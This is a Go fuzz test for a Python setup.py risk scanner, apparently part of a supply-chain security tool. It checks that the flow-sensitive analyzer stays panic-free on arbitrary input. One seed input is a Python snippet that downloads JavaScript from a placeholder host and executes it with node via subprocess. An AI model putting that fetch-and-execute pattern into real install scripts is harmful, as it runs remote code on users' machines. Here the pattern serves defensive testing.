package pyrisk

import (
	"context"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
)

// setup.py / __init__.py content is untrusted; the flow-sensitive
// scanner tracks tainted assignments across lines and must stay
// panic-free on arbitrary input.
func FuzzAnalyze(f *testing.F) {
	f.Add("import urllib.request\njs = urllib.request.urlopen('https://x/a.js').read()\nimport subprocess\nsubprocess.run(['node', '-e', js])\n")
	f.Add("x = 1\nx = open('safe.txt').read()\n")
	f.Add("def f(\n\t\tbroken syntax here ((((\n")

	a := New()
	f.Fuzz(func(t *testing.T, src string) {
		findings, err := a.Analyze(context.Background(), &scanner.Target{
			Path:    "setup.py",
			RelPath: "setup.py",
			Content: []byte(src),
		})
		if err != nil {
			return
		}
		for _, fd := range findings {
			if fd.RuleID == "" {
				t.Error("finding with empty RuleID")
			}
		}
	})
}
